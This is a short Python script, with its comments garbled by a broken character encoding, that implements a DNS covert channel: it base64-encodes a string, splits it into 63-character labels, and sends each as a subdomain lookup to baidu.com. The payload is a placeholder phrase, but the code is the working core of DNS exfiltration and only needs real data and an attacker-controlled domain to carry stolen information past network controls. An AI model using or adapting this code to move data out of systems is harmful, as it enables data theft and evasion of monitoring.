# -*- coding: utf-8 -*-
import dns.resolver
import base64

# �����ݱ���� DNS ��ѯ
def encode_data_to_dns(data):
    encoded_data = base64.b64encode(data.encode()).decode()  # ʹ�� base64 ����
    chunks = [encoded_data[i:i+63] for i in range(0, len(encoded_data), 63)]  # �����ݷָ�� 63 �ַ��Ŀ�
    return chunks

# ���� DNS ��ѯ
def send_dns_query(chunks):
    resolver = dns.resolver.Resolver()
    for chunk in chunks:
        try:
            query = chunk + ".baidu.com"  # ������������ѯ
            print("dcc dns: " + query)
            # ���� DNS ��ѯ������
            resolver = dns.resolver.Resolver()
            # ���� DNS ��ѯ����ȡ A ��¼
            result = resolver.resolve(query, 'A')
            # ��ӡ��ѯ���
            for ip in result:
                print(ip)
        except Exception as e:
            print("Failed to send DNS query:", e)

# Ҫ���������
data = "DNS covert channel data"

# �������ݲ����� DNS ��ѯ
encoded_chunks = encode_data_to_dns(data)
send_dns_query(encoded_chunks)

